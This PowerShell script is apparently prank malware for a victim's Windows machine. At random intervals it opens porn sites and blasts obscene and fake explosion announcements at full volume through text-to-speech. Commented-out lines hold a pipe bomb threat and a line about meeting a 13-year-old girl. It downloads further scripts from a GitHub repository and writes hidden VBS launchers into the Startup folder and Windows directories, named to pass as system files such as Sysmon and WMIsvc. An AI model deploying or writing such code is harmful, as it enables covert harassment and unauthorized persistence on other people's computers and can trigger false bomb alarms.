# Setup TTS etc
Add-Type -AssemblyName System.Speech
$speaker = New-Object System.Speech.Synthesis.SpeechSynthesizer
function set_AudioLevel($audioLevel){$wshShell = new-object -com wscript.shell; 1..50 | % {$wshShell.SendKeys([char]174)}; $audioLevel = $audioLevel / 2;1..$audioLevel | % {$wshShell.SendKeys([char]175)}}

# Erm, persist
Start-Process "C:\Windows\Logs\Sysmon.vbs"
Start-Process "C:\Windows\Help\NetworkDiagnostic.vbs"

while ($true){
    # Sleep for a random amount of time
    $randomWaitTime = Get-Random -Minimum 10 -Maximum 300
    Start-Sleep -Seconds $randomWaitTime

    # Decide action
    $randomNumber = Get-Random -Minimum 1 -Maximum 12

    if ($randomNumber -eq 1){
        Start-Process "https://porn.tgm.one"
    } elseif ($randomNumber -eq 2){
        set_AudioLevel 100
        #$speaker.Speak("I HAVE A PIPE BOMB THIS IS NOT A JOKE THERE IS A PIPE BOMB IN MY BACKPACK IT IS PRIMED TO EXPLODE")
        $speaker.Speak("AN EXPLOSIVE I PLANTED IN THE BUILDING HAS GONE OFF THERE IS AN EXPLOSION IN THIS BUILDING... IN MY PANTS I HAVE SHAT MY PANTS THERE HAS BEEN A POOPY EXPLOSION IN MY PANTS CLEAN UP AISLE MY PANTS")
    } elseif ($randomNumber -eq 3){
        set_AudioLevel 100
        $speaker.Speak("I HAVE BEEN EDGING FOR 48 HOURS IM GOING TO BUST ALL OVER")
    } elseif ($randomNumber -eq 4){
        set_AudioLevel 100
        $speaker.Speak("BATTERY LOW BATTERY LOW BATTERY LOW BATTERY LOW CHARGE BLUETOOTH INTEGRATED HIGH SPEED OSCILLATING ANAL SUPPOSITORY BATTERY LOW BATTERY LOW BATTERY LOW")
    } elseif ($randomNumber -eq 5){
        set_AudioLevel 100
        $speaker.Speak("DOWNLOADING GAY PORN DOWNLOADING GAY PORN GAY PORN DOWNLOAD IN PROGRESS DOWNLOADING MIDGET PORN DOWNLOADING GAY MIDGET PORN")
    } elseif ($randomNumber -eq 6){
        set_AudioLevel 100
        $speaker.Speak("RICHARD JOYCE THE THIRD RICHARD JOYCE THE THIRD RICHARD JOYCE THE THIRD ")
    } elseif ($randomNumber -eq 7){
        set_AudioLevel 100
        #$speaker.Speak("I AM HERE TO MEET A 13 YEAR OLD GIRL")
        $speaker.Speak("giacobe gigablasting into a cyberspace near you. Launching in 10... 9... 8... 6... 5... 4.......... UGHHHHHHHHHHHHH 3.. 2.. I CANT TAKE IT ANYMORE......... 1.. IM GIACOBE GIGABLASTING")
    } elseif ($randomNumber -eq 8){
        Start-Process "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
    } elseif ($randomNumber -eq 9){
        for ($i = 1; $i -le 10; $i++) {
            Start-Process calc.exe
        }    
    } elseif ($randomNumber -eq 10){
        Start-Process "https://wikifeet.com"
        Start-Process "https://feetfinder.com"
    } elseif ($randomNumber -eq 11){
        Start-Process "https://porn.tgm.one/shop"
    }

    # erm, persist
    if (-not (Test-Path "C:\Windows\System32\zh-cn\WMIsvc.ps1")){
        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lfgberg/erm/master/WMIsvc.ps1' -OutFile "C:\Windows\System32\zh-cn\WMIsvc.ps1"
    }
    if (-not (Test-Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.vbs")){
        New-Item -ItemType File -Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.vbs"
        Set-Content -Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.vbs" -Value 'CreateObject("WScript.Shell").Run "powershell.exe -WindowStyle Hidden -File ""C:\Windows\System32\zh-cn\WMIsvc.ps1""", 0, False'
    }
    if (-not (Test-Path "C:\Windows\Logs\Sysmon.ps1")){
        New-Item -ItemType File -Path "C:\Windows\Logs\Sysmon.ps1"
        Set-Content -Path "C:\Windows\Logs\Sysmon.ps1" -Value "while($true){if(-not (Test-Path 'C:\Windows\Help\NetworkDiagnostic.ps1')){Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lfgberg/erm/master/NetworkDiagnostic.ps1' -OutFile 'C:\Windows\Help\NetworkDiagnostic.ps1'}Start-Sleep -Seconds 900}"
    }

    if (-not (Test-Path "C:\Windows\Logs\Sysmon.vbs")){
        New-Item -ItemType File -Path "C:\Windows\Logs\Sysmon.vbs"
        Set-Content -Path "C:\Windows\Logs\Sysmon.vbs" -Value 'CreateObject("WScript.Shell").Run "powershell.exe -WindowStyle Hidden -File ""C:\Windows\Logs\Sysmon.ps1""", 0, False'
    }
}
